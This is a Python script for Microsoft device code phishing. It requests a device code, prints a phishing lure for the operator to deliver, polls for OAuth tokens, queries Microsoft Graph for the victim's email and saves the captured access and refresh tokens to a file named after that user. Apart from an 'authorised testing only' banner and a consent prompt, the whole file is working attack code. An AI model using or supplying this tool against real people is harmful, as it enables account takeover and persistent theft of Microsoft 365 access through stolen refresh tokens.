#!/usr/bin/env python3
"""
device_code_phish_simple.py – Microsoft device code phishing simulation.
Prints the lure to console, polls for tokens, saves token to a file
named after the victim's email address.
For authorised security testing ONLY.
"""

import requests
import time
import sys
import json

# ---------- Target Config ----------
TENANT_ID = "common"                # or your tenant domain / GUID
CLIENT_ID = "your-client-id"
RESOURCE  = "https://graph.microsoft.com"
POLL_INTERVAL = 5

# Microsoft endpoints
DEVICE_CODE_URL = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/devicecode"
TOKEN_URL       = f"https://login.microsoftonline.com/{TENANT_ID}/oauth2/v2.0/token"

def get_device_code():
    data = {
        "client_id": CLIENT_ID,
        "scope": f"{RESOURCE}/.default offline_access"
    }
    resp = requests.post(DEVICE_CODE_URL, data=data)
    resp.raise_for_status()
    return resp.json()

def poll_for_token(device_code):
    data = {
        "grant_type": "urn:ietf:params:oauth:grant-type:device_code",
        "client_id": CLIENT_ID,
        "device_code": device_code
    }
    while True:
        resp = requests.post(TOKEN_URL, data=data)
        j = resp.json()
        if resp.status_code == 200:
            print("\n[+] Tokens obtained!")
            return j
        err = j.get("error")
        if err == "authorization_pending":
            print("[*] Waiting for user to authenticate...")
        elif err == "slow_down":
            print("[!] Polling too fast, slowing down.")
            time.sleep(POLL_INTERVAL + 5)
        elif err in ("expired_token", "authorization_declined"):
            print(f"[-] {err}")
            return None
        else:
            print(f"[!] Unexpected: {j}")
            return None
        time.sleep(POLL_INTERVAL)

def main():
    print("[*] Requesting device code...")
    try:
        dc = get_device_code()
    except Exception as e:
        print(f"[-] {e}")
        sys.exit(1)

    user_code       = dc["user_code"]
    verification_uri = dc["verification_uri"]
    device_code     = dc["device_code"]
    expires_in      = dc.get("expires_in", 900)

    # Print the lure – you deliver it manually
    print("\n========== PHISHING LURE ==========")
    print(f"Go to: {verification_uri}")
    print(f"Enter code: {user_code}")
    print(f"Code expires in {expires_in} seconds.")
    print(f"Pre-filled link: {verification_uri}?otc={user_code}")
    print("===================================\n")

    input("Press Enter once you have delivered the code to the test user...")

    tokens = poll_for_token(device_code)
    if tokens:
        # Call Microsoft Graph to get the user's email
        graph_resp = requests.get(
            "https://graph.microsoft.com/v1.0/me",
            headers={"Authorization": f"Bearer {tokens['access_token']}"}
        )
        print("[+] Graph API /me response:", graph_resp.json())

        # Determine the filename based on user's email
        user_email = "unknown_user"
        try:
            me = graph_resp.json()
            upn = me.get("userPrincipalName") or me.get("mail")
            if upn:
                safe = "".join(c for c in upn if c.isalnum() or c in "@._-")
                if safe:
                    user_email = safe
        except Exception:
            from datetime import datetime
            user_email = f"unknown_{datetime.now().strftime('%Y%m%d_%H%M%S')}"

        # Save tokens to a file named after the user
        token_file = f"{user_email}.txt"
        with open(token_file, "w") as f:
            json.dump(tokens, f, indent=2)
        print(f"[+] Full token saved to {token_file}")

        print("[+] Access token (truncated):", tokens["access_token"][:50] + "...")
        if "refresh_token" in tokens:
            print("[+] Refresh token (truncated):", tokens["refresh_token"][:50] + "...")

if __name__ == "__main__":
    print("=" * 60)
    print("WARNING: Authorised testing only. Requires explicit consent.")
    print("=" * 60)
    confirm = input("Do you have authorisation? (yes/no): ").strip().lower()
    if confirm != "yes":
        print("Exiting.")
        sys.exit(0)
    main()